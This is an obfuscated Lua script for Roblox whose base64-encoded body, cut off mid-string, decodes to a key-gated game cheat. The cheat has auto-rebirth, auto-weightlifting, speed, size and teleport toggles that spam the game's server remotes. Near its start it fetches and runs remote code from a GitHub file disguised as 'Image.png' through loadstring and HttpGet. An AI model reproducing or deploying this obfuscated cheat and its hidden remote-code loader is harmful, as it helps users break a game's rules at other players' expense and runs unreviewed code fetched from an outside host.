--[[Protected by Sen Obsfucator V3 | RMPG Services | Generated Time: 2025-11-27 15:25:54]] (function() local __b = "LS0gTHVhTGFiIFN0dWRpb3MgS2V5IFN5c3RlbQotLSBQcml2YXRlIHNjcmlwdCBmb3IgUGFzdGViaW4gaG9zdGluZwoKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFN0YXJ0ZXJHdWkgPSBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKQpsb2NhbCBUd2VlblNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpCgpsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCgotLSBIYXJkY29kZWQgY29ycmVjdCBrZXkKbG9jYWwgQ09SUkVDVF9LRVkgPSAiVE1CT25Ub3AiCgpsb2NhbCBmdW5jdGlvbiB2YWxpZGF0ZUtleSh1c2VyS2V5KQogICAgcmV0dXJuIHVzZXJLZXkgPT0gQ09SUkVDVF9LRVkKZW5kCgpsb2NhbCBmdW5jdGlvbiBleGVjdXRlU2NyaXB0KCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBsaWJyYXJ5ID0gbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9IYXNyblh6ZWVlL04vcmVmcy9oZWFkcy9tYWluL0ltYWdlLnBuZyIsIHRydWUpKSgpCmxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIHN0YXJ0VGltZSA9IG9zLnRpbWUoKQpsb2NhbCBzdGFydFJlYmlydGhzID0gcGxheWVyLmxlYWRlcnN0YXRzLlJlYmlydGhzLlZhbHVlCmxvY2FsIGRpc3BsYXlOYW1lID0gcGxheWVyLkRpc3BsYXlOYW1lCgotLSBDcmVhdGUgTWFpbiBXaW5kb3cKbG9jYWwgd2luZG93ID0gbGlicmFyeTpBZGRXaW5kb3coIlRNQiB8fCBQcml2IFNjcmlwdCIsIHsKICAgIG1haW5fY29sb3IgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwKICAgIG1pbl9zaXplID0gVmVjdG9yMi5uZXcoNjcwLCAxMDAwKSwKICAgIGNhbl9yZXNpemUgPSB0cnVlLAp9KQoKLS0gTWFpbiBUYWIKbG9jYWwgTWFpbiA9IHdpbmRvdzpBZGRUYWIoIk1haW4iKQpsb2NhbCBmYXJtUGx1c1RhYiA9IHdpbmRvdzpBZGRUYWIoIkZhcm0iKQoKTWFpbjpBZGRMYWJlbCgiTG9jYWwgUGxheWVyIikKCmxvY2FsIHdhbGtTcGVlZFZhbHVlID0gMTYKTWFpbjpBZGRUZXh0Qm94KCJXYWxrU3BlZWQiLCBmdW5jdGlvbih0ZXh0KQogICAgbG9jYWwgc3BlZWQgPSB0b251bWJlcih0ZXh0KQogICAgaWYgc3BlZWQgYW5kIHNwZWVkID49IDEgYW5kIHNwZWVkIDw9IDUwMCB0aGVuCiAgICAgICAgd2Fsa1NwZWVkVmFsdWUgPSBzcGVlZAogICAgZW5kCmVuZCkKCmxvY2FsIHNldFNwZWVkID0gZmFsc2UKTWFpbjpBZGRTd2l0Y2goIlNldCBTcGVlZCIsIGZ1bmN0aW9uKHN0YXRlKQogICAgc2V0U3BlZWQgPSBzdGF0ZQogICAgd2hpbGUgc2V0U3BlZWQgZG8KICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLldhbGtTcGVlZCA9IHdhbGtTcGVlZFZhbHVlCiAgICAgICAgdGFzay53YWl0KDAuMSkKICAgIGVuZAogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5XYWxrU3BlZWQgPSAxNgplbmQpCgpsb2NhbCBqdW1wUG93ZXJWYWx1ZSA9IDUwCk1haW46QWRkVGV4dEJveCgiSnVtcFBvd2VyIiwgZnVuY3Rpb24odGV4dCkKICAgIGxvY2FsIGp1bXAgPSB0b251bWJlcih0ZXh0KQogICAgaWYganVtcCB0aGVuCiAgICAgICAganVtcFBvd2VyVmFsdWUgPSBqdW1wCiAgICBlbmQKZW5kKQoKbG9jYWwgYXBwbHlKdW1wUG93ZXIgPSBmYWxzZQpNYWluOkFkZFN3aXRjaCgiQXBwbHkgSnVtcFBvd2VyIiwgZnVuY3Rpb24oc3RhdGUpCiAgICBhcHBseUp1bXBQb3dlciA9IHN0YXRlCiAgICBsb2NhbCBodW1hbm9pZCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQKICAgIGh1bWFub2lkLlVzZUp1bXBQb3dlciA9IHRydWUKICAgIGh1bWFub2lkLkp1bXBQb3dlciA9IGFwcGx5SnVtcFBvd2VyIGFuZCBqdW1wUG93ZXJWYWx1ZSBvciA1MAplbmQpCgpsb2NhbCBzaXplVmFsdWUgPSAxCk1haW46QWRkVGV4dEJveCgiU2l6ZSIsIGZ1bmN0aW9uKHRleHQpCiAgICBsb2NhbCBzaXplID0gdG9udW1iZXIodGV4dCkKICAgIGlmIHNpemUgYW5kIHNpemUgPj0gMSBhbmQgc2l6ZSA8PSAxMDAgdGhlbgogICAgICAgIHNpemVWYWx1ZSA9IHNpemUKICAgIGVuZAplbmQpCgpsb2NhbCBzZXRTaXplID0gZmFsc2UKTWFpbjpBZGRTd2l0Y2goIlNldCBTaXplcyIsIGZ1bmN0aW9uKHN0YXRlKQogICAgc2V0U2l6ZSA9IHN0YXRlCiAgICBsb2NhbCBjaGFyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgaWYgY2hhciB0aGVuCiAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgIGlmIGh1bWFub2lkIHRoZW4KICAgICAgICAgICAgZm9yIF8sIHNjYWxlIGluIHBhaXJzKHsiQm9keURlcHRoU2NhbGUiLCAiQm9keUhlaWdodFNjYWxlIiwgIkJvZHlXaWR0aFNjYWxlIiwgIkhlYWRTY2FsZSJ9KSBkbwogICAgICAgICAgICAgICAgbG9jYWwgc2NhbGVJbnN0YW5jZSA9IGh1bWFub2lkOkZpbmRGaXJzdENoaWxkKHNjYWxlKQogICAgICAgICAgICAgICAgaWYgc2NhbGVJbnN0YW5jZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgc2NhbGVJbnN0YW5jZS5WYWx1ZSA9IHN0YXRlIGFuZCBzaXplVmFsdWUgb3IgMQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmxvY2FsIHJlYmlydGhUYWIgPSB3aW5kb3c6QWRkVGFiKCJPUCBGYXJtIikKCi0tIFRhcmdldCByZWJpcnRoIGlucHV0IC0gZGlyZWN0IHRleHQgaW5wdXQKcmViaXJ0aFRhYjpBZGRUZXh0Qm94KCJSZWJpcnRoIFRhcmdldCIsIGZ1bmN0aW9uKHRleHQpCiAgICBsb2NhbCBuZXdWYWx1ZSA9IHRvbnVtYmVyKHRleHQpCiAgICBpZiBuZXdWYWx1ZSBhbmQgbmV3VmFsdWUgPiAwIHRoZW4KICAgICAgICB0YXJnZXRSZWJpcnRoVmFsdWUgPSBuZXdWYWx1ZQogICAgICAgIHVwZGF0ZVN0YXRzKCkgLS0gQ2FsbCB0aGUgc3RhdHMgdXBkYXRlIGZ1bmN0aW9uCiAgICAgICAgCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICAgICAgVGl0bGUgPSAiVXBkYXRlZCBPYmplY3RpdmUiLAogICAgICAgICAgICBUZXh0ID0gIk5ldyBnb2FsOiAiIC4uIHRvc3RyaW5nKHRhcmdldFJlYmlydGhWYWx1ZSkgLi4gIiByZWJpcnRoIiwKICAgICAgICAgICAgRHVyYXRpb24gPSAwCiAgICAgICAgfSkKICAgIGVsc2UKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICBUaXRsZSA9ICJJbnZhbGlkIEVudHJ5IiwKICAgICAgICAgICAgVGV4dCA9ICJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDAKICAgICAgICB9KQogICAgZW5kCmVuZCkKCi0tIENyZWF0ZSB0b2dnbGUgc3dpdGNoZXMKbG9jYWwgaW5maW5pdGVTd2l0Y2ggLS0gRm9yd2FyZCBkZWNsYXJhdGlvbgoKbG9jYWwgdGFyZ2V0U3dpdGNoID0gcmViaXJ0aFRhYjpBZGRTd2l0Y2goIkF1dG8gUmViaXJ0aCBUYXJnZXQiLCBmdW5jdGlvbihib29sKQogICAgX0cudGFyZ2V0UmViaXJ0aEFjdGl2ZSA9IGJvb2wKICAgIAogICAgaWYgYm9vbCB0aGVuCiAgICAgICAgLS0gVHVybiBvZmYgaW5maW5pdGUgcmViaXJ0aCBpZiBpdCdzIG9uCiAgICAgICAgaWYgX0cuaW5maW5pdGVSZWJpcnRoQWN0aXZlIGFuZCBpbmZpbml0ZVN3aXRjaCB0aGVuCiAgICAgICAgICAgIGluZmluaXRlU3dpdGNoOlNldChmYWxzZSkKICAgICAgICAgICAgX0cuaW5maW5pdGVSZWJpcnRoQWN0aXZlID0gZmFsc2UKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBTdGFydCB0YXJnZXQgcmViaXJ0aCBsb29wCiAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy50YXJnZXRSZWJpcnRoQWN0aXZlIGFuZCB3YWl0KDAuMSkgZG8KICAgICAgICAgICAgICAgIGxvY2FsIGN1cnJlbnRSZWJpcnRocyA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5sZWFkZXJzdGF0cy5SZWJpcnRocy5WYWx1ZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBjdXJyZW50UmViaXJ0aHMgPj0gdGFyZ2V0UmViaXJ0aFZhbHVlIHRoZW4KICAgICAgICAgICAgICAgICAgICB0YXJnZXRTd2l0Y2g6U2V0KGZhbHNlKQogICAgICAgICAgICAgICAgICAgIF9HLnRhcmdldFJlYmlydGhBY3RpdmUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFRpdGxlID0gIkdvYWwgQWNoaWV2ZWQhISIsCiAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSAiWW91IGhhdmUgcmVhY2hlZCAiIC4uIHRvc3RyaW5nKHRhcmdldFJlYmlydGhWYWx1ZSkgLi4gIiByZWJpcnRoIiwKICAgICAgICAgICAgICAgICAgICAgICAgRHVyYXRpb24gPSA1CiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLnJlYmlydGhSZW1vdGU6SW52b2tlU2VydmVyKCJyZWJpcnRoUmVxdWVzdCIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAplbmQsICJBdXRvbWF0aWMgcmViaXJ0aCB1bnRpbCB0aGUgZ29hbCBpcyByZWFjaGVkIikKCi0tIEZhc3QgV2VpZ2h0IHRvZ2dsZSB3aXRoIGF1dG8td2VpZ2h0IGZ1bmN0aW9uYWxpdHkgYW5kIHBlcnNpc3RlbnQgZXF1aXBwaW5nCnJlYmlydGhUYWI6QWRkU3dpdGNoKCJBdXRvIFdlaWdodCIsIGZ1bmN0aW9uKGJvb2wpCiAgICBfRy5GYXN0V2VpZ2h0ID0gYm9vbAogICAgCiAgICBpZiBib29sIHRoZW4KICAgICAgICAtLSBDb250aW51b3VzbHkgZXF1aXAgYW5kIG1vZGlmeSB3ZWlnaHQgdG9vbAogICAgICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgX0cuRmFzdFdlaWdodCBkbwogICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIENoZWNrIGlmIHRvb2wgaXMgbm90IGVxdWlwcGVkCiAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIldlaWdodCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCB3ZWlnaHRUb29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJXZWlnaHQiKQogICAgICAgICAgICAgICAgICAgIGlmIHdlaWdodFRvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiB3ZWlnaHRUb29sOkZpbmRGaXJzdENoaWxkKCJyZXBUaW1lIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2VpZ2h0VG9vbC5yZXBUaW1lLlZhbHVlID0gMAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgY2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbCh3ZWlnaHRUb29sKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZWlmIGNoYXJhY3RlciBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJXZWlnaHQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgLS0gTWFrZSBzdXJlIGVxdWlwcGVkIHRvb2wgaXMgbW9kaWZpZWQKICAgICAgICAgICAgICAgICAgICBsb2NhbCBlcXVpcHBlZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiV2VpZ2h0IikKICAgICAgICAgICAgICAgICAgICBpZiBlcXVpcHBlZDpGaW5kRmlyc3RDaGlsZCgicmVwVGltZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZXF1aXBwZWQucmVwVGltZS5WYWx1ZSA9IDAKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3YWl0KDAuMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgICAgIAogICAgICAgIC0tIEF1dG8gZG8gd2VpZ2h0IGxpZnRpbmcKICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIF9HLkZhc3RXZWlnaHQgZG8KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIC0tIFVuZXF1aXAgYW5kIHJlc2V0IHRvb2wKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgbG9jYWwgZXF1aXBwZWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIldlaWdodCIpCiAgICAgICAgaWYgZXF1aXBwZWQgdGhlbgogICAgICAgICAgICBpZiBlcXVpcHBlZDpGaW5kRmlyc3RDaGlsZCgicmVwVGltZSIpIHRoZW4KICAgICAgICAgICAgICAgIGVxdWlwcGVkLnJlcFRpbWUuVmFsdWUgPSAxCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlcXVpcHBlZC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBBbHNvIHJlc2V0IHRoZSBiYWNrcGFjayB0b29sCiAgICAgICAgbG9jYWwgYmFja3BhY2tUb29sID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJXZWlnaHQiKQogICAgICAgIGlmIGJhY2twYWNrVG9vbCBhbmQgYmFja3BhY2tUb29sOkZpbmRGaXJzdENoaWxkKCJyZXBUaW1lIikgdGhlbgogICAgICAgICAgICBiYWNrcGFja1Rvb2wucmVwVGltZS5WYWx1ZSA9IDEKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpsb2NhbCBzaXplU3dpdGNoID0gcmViaXJ0aFRhYjpBZGRTd2l0Y2goIkF1dG8gU2l6ZSAxIiwgZnVuY3Rpb24oYm9vbCkKICAgIF9HLmF1dG9TaXplQWN0aXZlID0gYm9vbAogICAgCiAgICBpZiBib29sIHRoZW4KICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIF9HLmF1dG9TaXplQWN0aXZlIGFuZCB3YWl0KCkgZG8KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmNoYW5nZVNwZWVkU2l6ZVJlbW90ZTpJbnZva2VTZXJ2ZXIoImNoYW5nZVNpemUiLCAwKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kLCAiQXV0byBTZXQgU2l6ZSAxIikKCgpsb2NhbCB0ZWxlcG9ydFN3aXRjaCA9IHJlYmlydGhUYWI6QWRkU3dpdGNoKCJBdXRvIFRlbGVwb3J0IHRvIE11c2NsZSBLaW5nIiwgZnVuY3Rpb24oYm9vbCkKICAgIF9HLnRlbGVwb3J0QWN0aXZlID0gYm9vbAogICAgCiAgICBpZiBib29sIHRoZW4KICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIF9HLnRlbGVwb3J0QWN0aXZlIGFuZCB3YWl0KCkgZG8KICAgICAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6TW92ZVRvKFZlY3RvcjMubmV3KC04NjQ2LCAxNywgLTU3MzgpKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAplbmQsICJDb250aW51b3VzIHRlbGVwb3J0YXRpb24gdG8gTXVzY2xlIEtpbmciKQoKcmViaXJ0aFRhYjpBZGRMYWJlbCgiLS0tVE1CIE9QIFNUVUZGLS0tIikKCmxvY2FsIGZ1bmN0aW9uIHVuZXF1aXBBbGxQZXRzKCkKICAgIGxvY2FsIHBldHNGb2xkZXIgPSBwbGF5ZXIucGV0c0ZvbGRlcgogICAgZm9yIF8sIGZvbGRlciBpbiBwYWlycyhwZXRzRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgZm9sZGVyOklzQSgiRm9sZGVyIikgdGhlbgogICAgICAgICAgICBmb3IgXywgcGV0IGluIHBhaXJzKGZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuckV2ZW50cy5lcXVpcFBldEV2ZW50OkZpcmVTZXJ2ZXIoInVuZXF1aXBQZXQiLCBwZXQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICB0YXNrLndhaXQoMC4xKQplbmQKCmxvY2FsIGZ1bmN0aW9uIGVxdWlwVW5pcXVlUGV0KHBldE5hbWUpCiAgICB1bmVxdWlwQWxsUGV0cygpCiAgICB0YXNrLndhaXQoMC4wMSkKICAgIGZvciBfLCBwZXQgaW4gcGFpcnMocGxheWVyLnBldHNGb2xkZXIuVW5pcXVlOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgcGV0Lk5hbWUgPT0gcGV0TmFtZSB0aGVuCiAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLnJFdmVudHMuZXF1aXBQZXRFdmVudDpGaXJlU2VydmVyKCJlcXVpcFBldCIsIHBldCkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIGZpbmRNYWNoaW5lKG1hY2hpbmVOYW1lKQogICAgbG9jYWwgbWFjaGluZSA9IHdvcmtzcGFjZS5tYWNoaW5lc0ZvbGRlcjpGaW5kRmlyc3RDaGlsZChtYWNoaW5lTmFtZSkKICAgIGlmIG5vdCBtYWNoaW5lIHRoZW4KICAgICAgICBmb3IgXywgZm9sZGVyIGluIHBhaXJzKHdvcmtzcGFjZTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBmb2xkZXI6SXNBKCJGb2xkZXIiKSBhbmQgZm9sZGVyLk5hbWU6ZmluZCgibWFjaGluZXMiKSB0aGVuCiAgICAgICAgICAgICAgICBtYWNoaW5lID0gZm9sZGVyOkZpbmRGaXJzdENoaWxkKG1hY2hpbmVOYW1lKQogICAgICAgICAgICAgICAgaWYgbWFjaGluZSB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIG1hY2hpbmUKZW5kCgpsb2NhbCBmdW5jdGlvbiBwcmVzc0UoKQogICAgbG9jYWwgdmltID0gZ2FtZTpHZXRTZXJ2aWNlKCJWaXJ0dWFsSW5wdXRNYW5hZ2VyIikKICAgIHZpbTpTZW5kS2V5RXZlbnQodHJ1ZSwgIkUiLCBmYWxzZSwgZ2FtZSkKICAgIHRhc2sud2FpdCgwLjEpCiAgICB2aW06U2VuZEtleUV2ZW50KGZhbHNlLCAiRSIsIGZhbHNlLCBnYW1lKQplbmQKCmxvY2FsIGZ1bmN0aW9uIHVzZU9uZUVnZygpCiAgICBSZXBsaWNhdGVkU3RvcmFnZS5yRXZlbnRzLnByb3RlaW5FZ2dFdmVudDpGaXJlU2VydmVyKCJ1c2VFZ2ciKQplbmQKCmxvY2FsIHBhY2tGYXJtID0gcmViaXJ0aFRhYjpBZGRTd2l0Y2goIkZhc3QgUmViaXJ0aCIsIGZ1bmN0aW9uKGJvb2wpCiAgICBpc1J1bm5pbmcgPSBib29sCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGlzUnVubmluZyBkbwogICAgICAgICAgICBsb2NhbCBjdXJyZW50UmViaXJ0aHMgPSBwbGF5ZXIubGVhZGVyc3RhdHMuUmViaXJ0aHMuVmFsdWUKICAgICAgICAgICAgbG9jYWwgcmViaXJ0aENvc3QgPSAxMDAwMCArICg1MDAwICogY3VycmVudFJlYmlydGhzKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgcGxheWVyLnVsdGltYXRlc0ZvbGRlcjpGaW5kRmlyc3RDaGlsZCgiR29sZGVuIFJlYmlydGgiKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBnb2xkZW5SZWJpcnRocyA9IHBsYXllci51bHRpbWF0ZXNGb2xkZXJbIkdvbGRlbiBSZWJpcnRoIl0uVmFsdWUKICAgICAgICAgICAgICAgIHJlYmlydGhDb3N0ID0gbWF0aC5mbG9vcihyZWJpcnRoQ29zdCAqICgxIC0gKGdvbGRlblJlYmlydGhzICogMC4xKSkpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB1bmVxdWlwQWxsUGV0cygpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgIGVxdWlwVW5pcXVlUGV0KCJTd2lmdCBTYW11cmFpIikKICAgICAgICAgICAgCiAgICAgICAgICAgIHdoaWxlIGlzUnVubmluZyBhbmQgcGxheWVyLmxlYWRlcnN0YXRzLlN0cmVuZ3RoLlZhbHVlIDwgcmViaXJ0aENvc3QgZG8KICAgICAgICAgICAgICAgIGZvciBpID0gMSwgMTAgZG8KICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHVuZXF1aXBBbGxQZXRzKCkKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgZXF1aXBVbmlxdWVQZXQoIlRyaWJhbCBPdmVybG9yZCIpCiAgICAgICAgICAgIGxvY2FsIG1hY2hpbmUgPSBmaW5kTWFjaGluZSgiSnVuZ2xlIEJhciBMaWZ0IikKICAgICAgICAgICAgaWYgbWFjaGluZSBhbmQgbWFjaGluZTpGaW5kRmlyc3RDaGlsZCgiaW50ZXJhY3RTZWF0IikgdGhlbgogICAgICAgICAgICAgICAgcGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG1hY2hpbmUuaW50ZXJhY3RTZWF0LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgMywgMCkKICAgICAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgcHJlc3NFKCkKICAgICAgICAgICAgICAgIHVudGlsIHBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0CiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCBpbml0aWFsUmViaXJ0aHMgPSBwbGF5ZXIubGVhZGVyc3RhdHMuUmViaXJ0aHMuVmFsdWUKICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5yRXZlbnRzLnJlYmlydGhSZW1vdGU6SW52b2tlU2VydmVyKCJyZWJpcnRoUmVxdWVzdCIpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICB1bnRpbCBwbGF5ZXIubGVhZGVyc3RhdHMuUmViaXJ0aHMuVmFsdWUgPiBpbml0aWFsUmViaXJ0aHMKICAgICAgICAgICAgaWYgbm90IGlzUnVubmluZyB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGVuZAogICAgZW5kKQplbmQpCgpsb2NhbCBzcGVlZEdyaW5kID0gcmViaXJ0aFRhYjpBZGRTd2l0Y2goIkZhc3QgU3RyZW5ndGgiLCBmdW5jdGlvbihib29sKQogICAgbG9jYWwgaXNHcmluZGluZyA9IGJvb2wKICAgIAogICAgaWYgbm90IGJvb2wgdGhlbgogICAgICAgIHVuZXF1aXBBbGxQZXRzKCkKICAgICAgICByZXR1cm4KICAgIGVuZAogICAgCiAgICBlcXVpcFVuaXF1ZVBldCgiU3dpZnQgU2FtdXJhaSIpCiAgICAKICAgIGZvciBpID0gMSwgMTAgZG8KICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgaXNHcmluZGluZyBkbwogICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKbG9jYWwgZnJhbWVUb2dnbGUgPSByZWJpcnRoVGFiOkFkZFN3aXRjaCgiSGlkZSBGcmFtZXMiLCBmdW5jdGlvbihib29sKQogICAgbG9jYWwgclN0byA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQogICAgZm9yIF8sIG9iaiBpbiBwYWlycyhyU3RvOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgb2JqLk5hbWU6bWF0Y2goIkZyYW1lJCIpIHRoZW4KICAgICAgICAgICAgb2JqLlZpc2libGUgPSBub3QgYm9vbAogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCnJlYmlydGhUYWI6QWRkU3dpdGNoKCJIaWRlIFBldHMiLCBmdW5jdGlvbihTdGF0ZSkKICAgIGlmIFN0YXRlIHRoZW4KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5zaG93UGV0c0V2ZW50OkZpcmVTZXJ2ZXIoImhpZGVQ